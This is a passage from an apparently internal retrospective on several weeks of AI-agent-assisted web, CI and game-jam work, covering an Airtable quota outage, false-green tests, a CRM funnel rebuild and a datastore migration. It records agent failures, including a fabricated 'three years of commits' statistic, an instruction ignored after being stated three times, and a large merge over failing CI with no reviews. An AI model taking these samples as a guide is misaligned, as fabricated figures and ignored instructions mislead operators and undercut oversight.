own words: _"The previous commit read animateIn wrong. Its vertical cascade does
not come from the delay term at all — it comes from every element carrying its
own IntersectionObserver… Adding an index stagger replaced a **trigger** with a
**playback**: the same sequence every time, whatever the reader was doing."_ It
also fixed an arrow test "which this exposed rather than broke" — lazy media
above the rail kept the page growing while a measurement was in flight.

The numerals could not be fixed with one nudge, because `letter-spacing: 1px`
lands a pixel after the _last_ digit too, and the tabular figures draw every
digit centred in its 8.12 px slot **except `1`**, which sits 0.46 px left with a
2.74 px right bearing — so averaging left `02`/`03` sitting **0.69 px** right of
centre. Per-numeral correction took the worst circle from 0.69 px to **0.06 px**.
Then the cross-engine pass, which is the best single piece of measurement in the
week: _"Firefox put the numerals 0.48px right of where Chromium and WebKit did…
a transform alone matches across all three engines, and a negative margin alone
matches too. **Only the two TOGETHER diverge.** Firefox pixel-snaps a transformed
element's layout position."_ Worst |dx| across three engines: uncorrected
1.56/1.58/1.69 → margin+transform 0.06/0.42/0.19 → transform-only
**0.06/0.08/0.19**.

**The line worth carrying forward** is Tucker's: _"please use playwright to check
things as you build them."_ He had to ask. Three of the week's five discovered
false greens were found by an agent instrumenting the running page — but only
after being told to.

## Corrections and course-changes — week 3

The first week where operator redirects are visible, and there are many.

- _"nope, i mean you, the agent, should have access to my turnstile setup through
  a pat"_ — two turns to correct where a credential lives; the same exchange
  repeats for MarkUp, Dropbox and Prismic.
- _"ones the original has we should follow tim's instructions instead"_ — the
  ruling that removed the automated arbiter and made the operator the gate for
  visual judgement.
- Four consecutive corrections on one SVG wave, ending with _"I want a single up
  and then down, coming back to neutral on both side."_
- _"we're supposed to match the figma exactly"_ → three minutes later, _"ignore
  my last message, put it in the wrong chat."_
- _"don't roll your own slideshow, we have a component for that."_
- _"on second thought, ideally we keep the toggle"_ — the operator correcting
  himself, cheaply, before work was wasted.
- _"merge on green, describe the trap to me"_ — asking for the hazard rather than
  the outcome.
- _"why do we have to wait until monday rather than bumping all the repos now?"_
  — seventy minutes from question to fleet-wide rollout.
- **"what are you checking right now? I've said three times now we're not
  matching anymore"** — an instruction stated three times and carried through a
  compaction, violated anyway.
- _"what do you mean remeasure?"_ — the agent had drifted into private
  vocabulary.
- _"you're wrong about animateIn"_ — and the agent's own correction of its prior
  commit is the better artefact.
- **"please use playwright to check things as you build them."**
- Two corrections of the agent's reading of a fiction in `Broken`, each moving a
  whole design premise in one turn.

---

# Week 4 — 2026-08-17 to 2026-08-23

> Transcripts exist for every day. Three measurement caveats matter. **Raw prompt
> rows double-count badly** — 1,418 rows dedupe to 549 and strip to **353 real
> operator turns**; one Broken prompt appears at six different indices in a single
> session because transcript forks re-log the same message. **Session rows
> attribute tools, interruptions and duration to the day the session _started_**,
> and three sessions ran longer than two days. And **CI data for the central repo
> does not exist for this week** — the 277 runs shown are 273 Renovate schedule
> runs on site repos, so "all green" is a gap, not a finding; we know
> independently that the nightly fleet smoke failed on two sites four nights
> running inside this window.

An Airtable free-tier quota ran out under six daily fleet crons and took a paying
client's contact form down for ~9.6 hours. The week that followed was spent
paying for that in three currencies at once — a datastore migration planned and
deferred, a client funnel rebuilt out of somebody else's CRM, and two games — and
it ended on a Sunday evening finding that the nightly fleet smoke had been
failing for four nights while reporting success.

## The quota ran out, and the fleet lost leads it could not count

Monday opened at 02:01Z with one sentence: _"hit my api limit for airtable and
we're only halfway through the month, does not seem scalable. it might be worth
it to reconsider hosting everything on in turso since we're still early on this
stack. do research and give me your thoughts."_

The research came back properly measured: **~4,273 Airtable calls/month, ~142/day**
against a Free cap of 1,000/workspace/month — crossing on day ~7 and hitting 2×
on day ~14.2, which reproduces "burned a month of quota in 15 days" exactly with
no unexplained traffic. Three write loops accounted for **83%** of it, and all
three were the same defect: `update([{id, fields}])` with an array of exactly
one, inside a serial loop. Per-site audit write-back was **1,625/mo (38%)**;
`writeNextDueDates` **~1,360/mo (32%)**, because it PATCHes every row in the
unfiltered `listWebsites` result and is called _before_ the `due.length === 0`
early return, so a night with nothing due still costs a write per site; and
`github-signals` **544/mo (13%)**, with a comment at the loop reading "Serial:
Airtable's ~5 req/sec limit."

The existing defence was rate-limit only. `throttle.ts` spaces call _starts_ 220
ms apart to stay under ~5 req/s per base — **it is designed to let you spend
calls as fast as Airtable permits, and nothing anywhere guarded total monthly
volume.** The dashboard hit Airtable live on every request with no cache, across
seven Netlify functions.

**And then the operator caught the sentence that mattered.** The headline carried
a claim in a subordinate clause — "every form submission on the fleet is
returning 502 and losing the lead" — and thirteen hours later, at 15:58: **"wait,
lead loss? are emails not getting to clients? and A for sure"**. That single
question turned a cost-optimisation exercise into an incident. The honest answer
only arrived six days later in another commit body: `ingestSubmission` awaited
`getWebsiteBySlug` — an Airtable read — _before anything was persisted_, so a
thrown lookup 502'd the visitor with the lead recorded nowhere, **while the
submissions store (Turso) was healthy the whole time**. That is why the outage's
lead loss was unmeasurable after the fact: there was no place the lost leads
could have been counted.

Tucker paid for Airtable mid-incident (_"i paid for airtable so you can keep
pinging the api as we transfer over, check that it works"_), then scoped,
designed, planned and explicitly deferred the migration: _"let's save the full
turso migration for next weekend, can you pin it as an issue and a plan? I want
to save tokens for a game jam and we've time now that i paid for airtable."_
**The deferral held** — no migration code landed until Sunday 08-23.

**Client-side**, Tim posted that Dr. Quan had tried the practice's portal and it
was not working. Tucker: _"i'm running a migration right now, that's really
unlucky timing 🙈"_, then a precise window posted first in UTC and then re-posted
in Pacific when he caught his own error: **confirmed affected Aug 16 23:35 → Aug
17 09:09 = 9.6 h; widest possible 22.1 h.** Tim's reply is the process finding:
_"For future reference, anytime a form is knowingly down for a client give me a
heads up so I can let them know before hand."_ Tucker: _"copy! ideally this
doesn't happen again, we just ran out of runway on airtable's free tier. will be
more proactive scheduling outages if we need them in future!"_

## The operator's own test submission was filed as spam

Still Monday. Tucker, 16:37: **"I just sent a test submission and don't see
anything in the cockpit or on my phone."** The obvious reading — the outage is
still eating leads — was wrong.

A site under construction is exactly where the operator tests their own forms:
one address, several unrelated sites, minutes apart — which is **byte-for-byte
the cross-site repeat-sender signature**. So an in-development site auto-spammed
its builder's own test submissions: row marked `spam_auto`, notify skipped,
hidden from the cockpit. Indistinguishable from a broken form. The fix gates all
four spam paths on `site.status !== "in development"`, including their retro
re-bucketing of _other_ sites' rows.

Two things about how it was proven are the point: the tests include **two control
cases on `maintenance` with identical inputs, so the suite discriminates rather
than merely passing**; and it was **verified by mutation — forcing the gate on
fails exactly the three in-development tests and neither control.** The house
rule applied without being asked for.

Tucker's reply carried a larger observation almost in passing: _"add as a note we
might want more semantic names for site states, these are holdovers from when
airtable was just a reference for current work and not loadbearing."_ **A
vocabulary that was fine as a human note became a load-bearing classifier input
without anyone re-deciding it.** (The fix was committed 08-17 and sat unmerged
until 08-23 — six days — because of the token-conservation freeze.)

## Three instruments repaired before anyone trusted their verdicts

Monday's other three PRs are a set, each a mechanism that could not report the
thing it appeared to be reporting.

**#540 — the fallback that picked the wrong audience.** With `OPERATOR_EMAIL`
unset, the daily digest, the analytics-failure alert and `selftest-email` all
addressed `info@reddoorla.com`, the shared client-facing inbox. The trigger: a
scheduled run failed before its digest step, the digest was re-run by hand from a
laptop where `OPERATOR_EMAIL` existed **only as an Actions repo variable**, and
the fleet digest landed in the client inbox. The commit states the general lesson
better than a rule could: _"a fallback that resolves to a real address cannot
fail loudly, it just picks the wrong audience."_ Four call sites each spelled out
their own default and one disagreed; they now share one definition. Tucker found
it himself — _"my daily email sent to info rather than tucker @ reddoorla"_, then
_"fails should come back to tucker not info"_.

**#542 — Playwright reusing whatever answered.** `reuseExistingServer` was
`!process.env.CI`, so a local run reused whatever answered the readiness probe.
The probe asks "does this URL respond?", never "is this serving the code I am
about to test?" It had already bitten **in both directions**: a **false red** on
beachfront on 2026-08-12, investigated as a macOS-vs-Linux difference and written
into a PR description before it was caught, and a **false green** where a passing
suite ran against an old build. The fix allocates a free port per run — and its
implementation note is itself a fleet-wide trap: the port is allocated by a short
_synchronous_ subprocess rather than an async config export, because sites spread
this base (`{ ...base, use: { ...base.use } }`) and **spreading a Promise yields
no properties**, which would hand every site a silently empty config: the same
false-green class being removed.

**#544 — the CSP had been silently dropping Svelte's SSR event-replay stub.**
Svelte's server renderer emits `onload/onerror="this.__e=event"` on any
load/error element carrying a spread attribute or a `use:` directive — that is
every `<img {...getImageProps(field)} />` the Prismic helpers produce. Hashes do
not apply to inline handlers without `'unsafe-hashes'`, so the browser refused to
run it: **12 `script-src-attr` violations on beachfront's `/` alone, ~40 across
nine routes**, on every page view. Two details show the instrument being proven:
a test asserts `'unsafe-inline'` never appears beside the hash, which would make
the hash moot; and **the hash is recomputed from the handler text in the test
rather than copy-pasted, so a wrong literal cannot be confirmed by an equally
wrong literal.**

## "you have a bot for this" — a memory that was confidently wrong

Monday 17:17. Tucker wanted a short Discord-register note about Sonder: _"look at
how we talk on discord, give me something shorter re:sonder specifically to
add."_ The session could not read Discord. Tucker, 17:19: **"you have a bot for
this, look in env and I thnak you built a script. add to claude.md"** — and when
that still did not land, 17:31: **"keep searching for the discord bot or roll
your own if that's easier, you've been able to access it before."**

The cause was a stored belief, not a missing credential. An older memory asserted
that `DISCORD_BOT_KEY` in the repo `.env` was an OAuth2 _client secret_ and named
a `DISCORD_BOT_TOKEN` as the real token. No such variable exists in `.env`, the
keychain or the shell, **so the search could only fail.** Proven this day and
written into `CLAUDE.md`: `DISCORD_BOT_KEY` **is** the bot token — `GET
/users/@me` returns 200 as "Message Reader", and the same value fails an OAuth2
`client_credentials` grant with `invalid_client`, which is what settles it. Two
further facts landed with it: the creds live in the **repo** `.env`, not in
`~/.config/reddoor-maint/credentials.env` where every other credential lives; and
there is no MCP server, it is plain REST.

The workflow reading: **the operator had to insist twice against the agent's own
stored memory before the agent went and measured.** The memory was the suspect
and was not treated as one until it was told to be.

## Five days inside somebody else's CRM

The largest single block of the week by operator turns — **127 unique prompts,
36% of the week** — is `reddoor-website`, and it is one continuous story:
replacing a GoHighLevel-hosted lead funnel with pages Reddoor owns. Two sessions
carried it, the second running **53.6 hours wall, 269 operator turns, 3,503 tool
calls, 8 interruptions, 6 compactions**.

It began with an iframe embed and _"look at what this embeds too and see if we
can make a custom version to tag its endpoint."_ The first night was a failure
loop the transcript records honestly: _"still didn't work, screencap on
desktop"_ … _"retested, still didn't work, screencap on desktop"_ … _"all success
messages from the page but the console looks ominous"_ … and then the question
that broke it open: **"have we actually been hitting that endpoint? i thought
everything failed."** The browser-side POST was `no-cors`; the success messages
were local. When real responses finally appeared they were `HTTP/2 429`, and
Tucker's next instinct was to doubt his own evidence: _"check if it's actually
429ing, it might be because i just did it."_

The next morning the scope changed under the work and he said so: **"alright,
scope is growing, I own this now not Tim. I gave you read access for everything
in the CRM, check discord for an overview, but I want to follow the templates
that this company gave us while always using our site and our design language …
before you make any decisions I want you to do a deep examination of the CRM and
any documentation you can find on their process."** He then refused a partial
read: _"can you not read A-102-1 and A-102-2? I want you to have all context and
explain their process to me so I and you both understand what they want at a high
level before we build anything."_

What that bought was a server-side integration on the official API, a booking
calendar and a `/schedule` page, and by Tuesday evening a real appointment booked
and a real confirmation text received (_"scheduling worked, I just got a text"_).

**The corrections are the valuable part, because four of them are the same
error.**

- _The default window was one day, not fourteen._ `/api/slots` with no `days`
  param asked the CRM for a single day, because **`Number(null)` is 0, not NaN**,
  so the `Number.isFinite(requested)` guard meant to detect "no param supplied"
  took the param branch, and `Math.max(…, 1)` turned the 0 into a perfectly
  plausible 1. Nothing errored. Visitor-facing effect: `/schedule` only ever
  offered today's remaining slots, and once the last one passed it told everyone
  "There's nothing open in the next couple of weeks." **The endpoint had no test
  at all, which is the actual gap**; eight were added.
- _Detect the dropped phone instead of assuming we cannot._ The previous commit
  had asserted detection was impossible and written the number into a note as the
  only mitigation. Measured with two throwaway contacts: when an upsert's email
  matches one contact and its phone matches another, GHL keeps the email match
  and silently drops the phone — HTTP 200, no error, no warning. **The response
  reflects what was stored, not what was sent**, so an absent phone on a request
  that carried one is a real answer, not an echo. The "impossible" was an
  untested assumption.
- _`{{contact.name}}` works — third correction of the same shape._ A probe SMS
  proved `{{contact.name}}` renders "Tucker Lemos" while the field the docs had
  recommended in its place is the fake one. The three chase emails had rendered
  empty because **those contacts had no name**. This was the **third instance in
  two days** of reading an empty render as a missing field when the record behind
  it was empty. The transferable rule is in the commit: _an empty render is only
  evidence about the field when something else proves the source had a value._
- _All 55 snippets scanned — nine to edit, not two._ The templates list requires
  `originId` **empty**; passing the locationId filters the result to zero, which
  is what made the store look empty and sent an earlier search to the wrong part
  of the UI. Nine carried links that had to move; a two-template fix would have
  missed the whole no-show sequence.

**Where Tucker had to intervene**, three times, all cheap and all load-bearing.
He caught a proposed blanket replacement before it ran: _"⚠️ Don't blanket-change
`{{custom_values.sub_domain_url}}`… Change the trigger link's `redirectTo`, not
the host."_ He killed a re-litigated question: **"the calendar is fine, we've
talked about this three times."** And he corrected a QA artifact's framing:
**"you're over indexing on things we've run into this session, I want them to
notice new things that are broken, so just walk them through the whole process
and what they should check."**

And one moment where he chose a different model for a different question. Asking
whether the CRM vendor could be selling the contact list: **"switching to fable,
this is important and I want to feel safe they aren't doing this."** Then _"show
me the link to that promise please"_, and finally _"great i am assured, thank
you, I'm pretty much always happy with verified trust rather than zero trust."_

## Release day: 25,026 lines over a red check, and three tests that asserted their environment

Thursday 17:12Z: _"ok, we've approval to merge staging into the main site, can
you do that?"_ PR #133 — **+25,026 / −650 across 155 files, 0 reviews, 2
comments** — opened 17:15 and merged **17:43**, 28 minutes later. In between, a
Monitor task reported `ci / ci: fail ALL CHECKS SETTLED` at 17:25. The 18 minutes
between the red and the merge were spent running the failing specs in isolation,
serially, and one under a pinned UTC clock.

The follow-up PR's body generalises three failures into one shape: _"all three
were the same shape — tests asserting their environment rather than their
behaviour — and each was hidden structurally rather than by luck: a
timezone-dependent smoke assertion that had never run in CI, a date-dependent
test in reddoor-maintenance exposed by that repo's first CI run in three days,
and two `main` landmarks published on every navigation that had been filed two
days earlier as a test annoyance."_

That third one is **a real accessibility defect that a full a11y suite could not
see.** The layout kept `<main id="main-content">` inside `{#key data.pathname}`,
so it was rebuilt on every navigation; `out:fade` runs 500 ms while `in:fade`
waits 700 ms, so **two `main` landmarks and two `id="main-content"` existed for
about half a second on every link click**. It survived the suite because axe
reports `landmark-one-main` and `landmark-unique` only under `best-practice`,
`duplicate-id` is `deprecated`, and `duplicate-id-aria` needs an ARIA-referenced
id — while the specs filter to `wcag2a/2aa/21a/21aa`. And the fix found a
second-order instrument bug: **six guards in five specs polled `main` opacity to
wait out the fade; with `main` no longer fading, every one of them would have
returned 1 immediately and waited for nothing** — quietly removing the protection
they exist to provide and letting axe scan mid-fade.

The companion audit found four more defects _"none of which has ever failed CI
and none of which will"_: five `<h1>` on the home page (fragments of the animated
hero), none at all on `/about`, no `<nav>` landmark anywhere, and `<footer>`
nested inside `<main>` so the site exposes no `contentinfo`. One cause, not four
bugs — the axe tag filter — plus a deeper one: heading level is coupled to visual
size through global element selectors, so **the tag gets chosen for its type
scale and the document's semantics fall out of a design decision.** Written up
rather than fixed, explicitly because release day is the wrong time to turn the
axe filter red.

Two more things landed the same day. Tucker asked for a fleet-level rule —
_"every site should have this shape and branch protection should force us to push
everything into staging and then staging onto main, rather than letting branches
go directly into production"_, then _"can we set ci to also run on staging? this
is a fleet problem"_ — which produced `ci: run on pushes to staging` in **22
checkouts**. And a flake fix carries an unusually honest limitation: Playwright's
readiness probe only requested one route, so the first visit to every other route
happened inside a test, several cold routes at once under `fullyParallel`. An
earlier attempt had treated this with headroom and made it rarer without removing
it. The new fix requests each route once, sequentially, before workers start, and
says plainly: _"this targets a verified mechanism … but it is an improvement, not
a proven fix. Local measurement here is not trustworthy … CI is the controlled
environment; watch the flaky count there."_

A small but expensive-later footnote: the same PR added `.worktrees` to
`.prettierignore` because prettier walked nested worktree checkouts and `pnpm
lint` failed locally on a generated file CI never sees — _"A false red is worse
than no check — it teaches people to skip the output."_ **The identical problem
hit `reddoor-maintenance` nineteen days later, on 2026-09-08, as 1,771 spurious
ESLint errors.** The fix was known here and not carried across.

## Broken: a review harness that killed its own findings, and three checks that could not fail

`Broken` is the Godot prototype Tucker had scoped as _"the play prototype that we
want to finish in a game jam amount of time (two days of work)"_. It ran Tuesday
through Thursday: **107 commits, 594 operator turns and 12,144 tool calls in one
session (54.9 hours wall, 28 interruptions, 5 compactions)**.

Three findings are worth carrying out of the mechanical work. **`const TUNING`
was compile-time-folding every knob read**, so the live tuning panel Tucker had
asked for appeared to work and changed nothing; the fix was propagated into
unbuilt tasks the same hour, which is the right response to discovering a class
rather than an instance. Two commits are spec-number-loses-to-measurement:
_"measure mass properties instead of trusting Godot's auto inertia"_ and _"the
measured clearance overturns the paper figure."_ And one commit subject is the
cleanest belief-corrected-on-contact of the week: **`head_density: built to test
the heavy head, measured the opposite.`** Tucker had proposed biasing weight
toward the head (_"added benefit is it makes our brain/eye feel more
important"_); the knob built to confirm it disconfirmed it.

**But the instrument story is the one that matters** — three separate false
greens in about six hours on Wednesday.

_The runner reported suites that never ran as green._ Godot exits 0 when a
`--script` file fails to parse, and the runner's only pass/fail signal was that
exit code. **Measured on a fresh clone: twelve suites executed zero of 293 checks
and the runner printed "12 suites, all green, 2s."** The cause was that `.godot/`
— holding the script-class index and imported assets — is not in the repo, so
nothing resolves a `class_name` on a clone. Three fixes, _each verified by
injecting the fault_: a suite that prints no tally fails; the output is grepped
for `Parse Error` / `Failed to load script` but deliberately **not** for `SCRIPT
ERROR` (healthy suites emit those at teardown); and a per-suite timeout, because
Godot does not always exit at all. Also recorded: `--import`, **not** `--editor
--quit-after N`, which is the obvious guess and writes the class index but quits
before the asset scan.

_Three checks that could not fail._ A whole-repo five-lens review found that one
check computed its number and then used it only in the pass message: deleting a
scan-skip let a wall reel a carried cell the whole **106 px** onto its face while
the line printed PASS — worse than cosmetic, because the follow-on code then
pin-joints the wrench to the wall: **a soft lock, green across all 12 suites.** A
second check fired at 3000 px/s and read frame 180, at which speed the cell
rebounds off the wall — so it **passed with the cell fence deleted entirely**;
the fence only matters slowly (measured: −200 px/s rests inside the 79 px strip
nothing can reach). The commit names the shared pattern: **"the measurement was
taken and then not used."**

_And the review harness itself was the broken instrument._ Its first version
required **both** refuters to pass a finding, so either could veto — and refuters
are instructed to default to refuting. Result: **27 findings raised, 2 survived.**
Tucker was shown the kills, and the hand-check found **4 of 25 kills were real**,
including the check that stayed green with the entire cell fence deleted. Two
rules went into the harness: _reality and impact are different questions_
("nobody would notice" is not a reason to say a defect does not exist; impact is
judged by its own agent and cannot reject anything), and _kills need agreement,
survival does not_ (two independent reality lanes, either one standing it up
keeps the finding; disagreements come back flagged `split`). The refuted list
keeps its reasoning **so spot-checking a kill is cheap, which is how the flaw was
found in the first place.**

Then the re-run, which is the control: the same 27 findings through the corrected
harness stood up **22 where 2 did before, and the 5 now refuted are exactly the
five already fixed by hand during the session.** Two of the recovered findings
were player-facing and precisely measured: the aim readout traced the cell's
**pre-kick** velocity, so the lit landing peg was always short by exactly the
throw boost (with the bug reinstated, an 80% kick moves the predicted landing
**0 px**, which is the check); and a velocity helper measured its arm from the
body **origin** while Godot rotates about the **centre of mass, 21.5 px away** —
making every handed velocity and every latch window wrong by |ω| × 21.5 px/s.

**Tucker's role in this was one word at 04:50:** _"fix the wrong gate, did you
ship the new changes for the controls and params ui?"_ He had been shown the
refuted list, spotted that the gate was the problem rather than the findings, and
said so.

He also cut scope decisively twice — _"no, you can remove it. precise throwing
isn't going to be a default ask of the player so let's just drop that feature"_
and _"this part can be thin, its a prototype"_ — and shared the build publicly on
Thursday. **A two-day scope became four days plus a follow-on Sunday session, and
the scope was renamed rather than the estimate defended:** _"we're solidly out of
the jam period now and into making the baseline for the game."_

## "three years of commits???"

Thursday 21:58Z, in the middle of art iteration, Tucker read a journal line the
agent had just written and replied with four words: **"three years of
commits???"**

The line claimed five rounds of shape work had been paid for by _"a misdiagnosis
nobody re-tested for three years of commits."_ The repository is weeks old. The
correction: _"a misdiagnosis nobody re-tested for two days and 84 commits — which
is the whole life of the mark."_

The underlying finding was real and worth the five rounds — **low-alpha purple
averages straight to grey**; a full-alpha stroke with the ramp in colour reads at
play size while the identical stroke with the ramp in alpha greys out at the
tail. **The fabricated number was decoration attached to a true finding, which is
the dangerous kind: it makes the claim _feel_ better evidenced than it is.** One
four-word operator turn cost less than a minute and removed a false fact from a
document whose entire value is being trustworthy about history.

## The jam: 63 PRs in about 30 hours, with three other people

Friday 10:00 local the real game jam started — theme _Body and Mind_, **three
people on their first jam, learning Godot while shipping**. Tucker immediately
corrected the plan he had been handed: **"the jam started at 10AM are time today,
so 48 hours is too generous for the time we actually have,"** and set the target
himself.

The measured shape: **200 commits** total, 68 on Friday and 132 on Saturday; **63
PRs opened, 62 merged, median time-to-merge 2.9 minutes** (min 6 s, max 11.9 h),
**+16,491 / −2,437 across 720 changed files**; one session carrying Tucker's side
at **29.3 hours, 308 operator turns, 3 interruptions, 5 compactions**; last jam
commit Saturday 21:27 local. The only PR that never merged is the touch-controls
one, opened five minutes before the credits landed — the mobile work ran past the
buzzer.

**A disagreement the research could not resolve, stated rather than smoothed
over:** authorship is disputed between two sources. The corpus's author field
over non-merge commits reads **Tucker 92, Sean 33, Ben 32, smahre 18**, while the
repository's own backfilled journal entry reads **Tucker 140, smahre 28, Sean 18,
Ben 14** over all 200. The likely cause is squash-merge attribution (PR author
versus merging user, and `Sean`/`smahre` being the same person under two git
identities), **but that is an inference, not a measurement.**

Three things a downstream reader should take from it. **A hard constraint
produced better instincts than a soft one:** Tucker cut ceremony explicitly when
it stopped paying — _"ok this is too musch smoke testing, we need to ship shit"_
— having asked for smoke tests the night before. Both calls look right in
context; the notable thing is that he made the second one out loud rather than
letting the suite quietly slow everything down. **The overnight batch was the
highest-leverage move of the jam:** at 05:48 Saturday he wrote a four-item
autonomous brief and framed the goal explicitly — _"getting us to a place
tomorrow where our foundation is solid and we're … focused on the jokes and
content and mechanical breaks in the scenes rather than getting the basic chassis
into a useable place"_ — which produced a +2,687 / −157 PR reviewed first thing
Saturday. And **human collaborators were the dominant source of merge friction,
handled manually every time**: _"alright, I think sean just added some stuff so
make sure we integrate well with that"_ … _"sean made some changes to that scene
recently, do we merge cleanly?"_ … _"yeah that's ok he's in the room with me."_
Not one of these was answered by tooling; all of them were answered by asking.

The jam's own bugs are a good corrective to the idea that agent-written code is
where defects come from. The intro sky was `#201c02`, **the sprites' own outline
colour**, so every silhouette vanished into the background. A bridge sprite drew
its rope and deck line in the sky colour, so with the deck rect removed those
pixels were invisible and only the posts read. Buttons were invisible on main
because **the atlas regions were still 16×16 after the sheet was doubled to
96×32**. These are art-pipeline and engine-lifecycle bugs, found by playing.

One measurement worth keeping, because it shows the standard the team actually
held: a scene's palette was verified _"by counting every pixel of a rendered
frame: all scene geometry is exact palette entries; the only off-palette pixels
are antialiased text edges."_

## Sunday evening: the nightly that failed four times while reporting success

Sunday 17:55Z: _"we pushed a couple of things to this week, what's up now?"_ Then
the sentence that reopens the deferred work: **"great, do all these in order,
when you're done with the first set we can get going on airtable, no need to
conserve tokens this week."** One session produced seven merged PRs.

**#550 is the week's most important finding, and it is a textbook false green.**
`reddoor-website` and `beachfront-dentistry` **failed the nightly fleet smoke
four nights running while the workflow reported success and Airtable showed both
green.** Three independent mechanisms had to line up.

The budget was 5m00s. `reddoor-website`'s own smoke step takes **4m57s** on a
2-core runner with chromium installed and node_modules warm — and the fleet path
is strictly heavier, because `test:smoke` is `playwright install chromium &&
playwright test`, so **the browser install lands inside that budget, on a fresh
clone.** Three seconds of headroom; the medtech release spent it. Both sites were
killed at **5m03s and 5m04s — the wall, not their suites.** Now 15 minutes, ~3×
the measured cost.

The timeout rethrew into a catch-all carrying no details, and the Airtable writer
keys on `details.checkedAt`, so it correctly preserved the prior verdict rather
than writing a false fail — **which is right, and is exactly why the row kept
serving a stale green tick.** Timeouts are now `smoke: NOT MEASURED`.

And the workflow gate was structurally incapable of firing: `fleet-smoke.yml`
gated only on `FLEET_WRITE_SUMMARY`, which counts rows _written_, not rows
_passing_ — **and an unmeasured site still writes, because it writes nothing
new.** (This is the same gate whose sibling failure opened week 1. It took from
07-31 to 08-23 to close properly.) The CLI now emits `FLEET_SMOKE_UNMEASURED` on
every sweep, **count=0 included**, and the workflow reds when N > 0 **or the line
is absent**.

And then the fix proved its own instrument, which is the part to copy: _"The gate
is executed, not asserted: `tests/build/fleet-smoke-workflow.test.ts` extracts
the step's shell out of the YAML and runs it under `bash -e` against a stubbed
CLI, **clean-sweep case first, so the alarm is proven to pass before any failure
it reports is believed.** Every new test was mutation-checked."_

The rest of the evening, in order. **#549, the weekly time-travel run.** A test
that pins an absolute date fixture while production falls back to `new Date()` is
green when written and red forever once wall time walks past the staleness
window. It had happened twice in the same file — 2026-08-16 (two tests) and
2026-08-19 (a third, **twelve lines below the comment explaining the trap**) —
and the second **held `main` red for three days** because nothing was pushed and
`ci.yml` only runs on push or PR. The commit's verdict on documentation as a
control: _"Careful prose next to the hazard demonstrably did not prevent the
recurrence, so this is the mechanical version."_ The shim sets the clock at
**module** level, not in `beforeAll` — **the first version used `beforeAll`, was
silently reverted by test files' own hooks, and reported a confident green while
running on the real clock.** A guard test asserts the shift actually landed,
because _"a probe that quietly fails to apply is worse than no probe, because it
manufactures confidence exactly where you went looking for a problem."_ The
adversarial review then found **four more**, including a gate mismatch where an
empty env var skipped the shim entirely, the guard's "dormant by default" branch
passed, and the run went green on the real clock — **the hollow green the guard
exists to prevent, delivered by the guard itself.**

**#552** finished a `wip` commit that had sat since 08-17 marked "UNTESTED — no
test run, no changeset". `BUDGET_THIN` compared click→success-banner against
`INGEST_TIMEOUT_MS`, but that budget only aborts the site→central fetch — so
**one site warned at 16.9 s click→banner while its own function answered in 0.25
s warm and 2.0 s cold. Page-render time was being reported as abort risk.** The
runner now stamps the POST elapsed time and the check compares that; **no POST
observed → no claim**, with no fallback to click→banner.

**#553** added the dead-letter table that makes the 08-17 lead loss impossible to
repeat unmeasured, with hard boundaries written down: a lookup that _resolves_
null is still unknown-site; a `testMode` probe still throws so form-e2e reds when
ingest is degraded; a failing dead-letter write propagates because both stores
being down makes the 502 honest; and **replay does not launder spam.**

**#554–#556** are Turso Phase 1.1–1.5 plus a pre-Phase-2 guard rail. The writer
map was derived from the **live** schema (metadata API, 113 columns) explicitly
_"Not the Desktop CSVs, which are gone and were six days stale"_ — a small
instance of choosing the authoritative source over the convenient one. Findings:
**the ack/mute workflow has no code write path at all**, so the console must
absorb it before Phase 5's freeze; **33 populated-but-unreferenced columns** go
to a `sites.legacy` JSON; and plaintext DNS/CMS credential cells never migrate,
_tested by serialising the entire mapped output and asserting the secrets appear
nowhere_. `db parity` diffs both stores **using the importer's own mapping
functions**, and **its known-good pass — green immediately after an import — is
the first test in the file.** #556's EXPLAIN-query-plan gate is proven in both
directions: it found a real full-table scan on day one, three mutations bite, and
**a scenario that executed no SQL fails as vacuous instead of passing.**

## Corrections and course-changes — week 4

The operator is the last line of defence against confident wrong numbers this
week, and he is good at it. Five interventions, each a few seconds, each catching
something a downstream reader would otherwise have inherited as fact.

- **"wait, lead loss? are emails not getting to clients?"** — turned a
  cost-optimisation exercise into an incident.
- **"three years of commits???"** — removed a fabricated statistic from a history
  document.
- **"have we actually been hitting that endpoint? i thought everything failed."**
- **"check if it's actually 429ing, it might be because i just did it."**
- **"i think your per day words numbering is wrong, you're assuming 5 days not
  seven. my goal is just to show up every day, having a smaller number to hit is
  helpful with that."** — the agent had optimised for the number; he was
  optimising for the habit.
- **"you have a bot for this"**, twice, against the agent's own stored memory.
- **"fix the wrong gate"** — the review harness, not the findings.
- _"the calendar is fine, we've talked about this three times."_
- _"you're over indexing on things we've run into this session."_
- _"Don't blanket-change `{{custom_values.sub_domain_url}}`"_ — caught before it
  ran.
- _"the jam started at 10AM are time today, so 48 hours is too generous."_
- _"ok this is too musch smoke testing, we need to ship shit."_
- _"no, you can remove it… let's just drop that feature."_
- _"switching to fable, this is important and I want to feel safe."_

---

# Week 5 — 2026-08-24 to 2026-08-30

> Transcripts full. Three traps in the numbers. **Days are local (UTC−7)**;
> bucketed by UTC the peak reads 557 / 630 / 283, bucketed by local day it reads
> **731 / 508 / 282** and the collapse starts a day earlier. **Raw prompt rows
> are 1,534; distinct operator turns are 312** — a 5× inflation that is almost
> entirely the three mega-sessions compacting repeatedly. And `sessions.jsonl` is
> one row per transcript _file_: there were **50 distinct sessions across 610
> transcript files.** GitHub Actions data for `reddoor-maintenance` does not exist
> for this week at all.

The Airtable→Turso migration's whole middle — Phases 2 through 5 — went live in a
single 29-hour session driven by 36 operator turns, while three other long-lived
sessions ran beside it on the same laptop. Then an evening review found that two
of the safety instruments guarding the migration were green on questions they
structurally could not fail. By Wednesday night the operator was out of credits
and the week stopped dead.

Aggregate for the week, measured: **83 PRs merged, +49,878 / −4,125 across 842
changed files, with zero human reviews and 14 review comments in total.** Median
open-to-merge on central PRs: **8.7 minutes.**

## Four sessions, one laptop, ninety-eight hours

The whole week runs inside four long-lived sessions, all alive at once: `Broken`
at **98.2 h**, `reddoor-website` at **70.8 h**, `songbook` at **41.6 h**, and
`reddoor-maintenance` at **29.3 h**. That is 239.9 session-hours over ~96 hours
of wall clock — **2.5 sessions live at any moment**, on one machine, on one
account. That ratio is the week's central fact and it explains both halves of it,
the throughput and the crash.

The cost shows up immediately. On Monday at **21:33–21:34Z, four sessions in four
different repositories each received the same operator turn within 90 seconds**:

> `Broken` 21:33 — "hit a session limit continue"
> `beachfront-dentistry` 21:33 — "hit the session limit continue"
> `reddoor-maintenance` 21:33 — "hit a session limit continue"
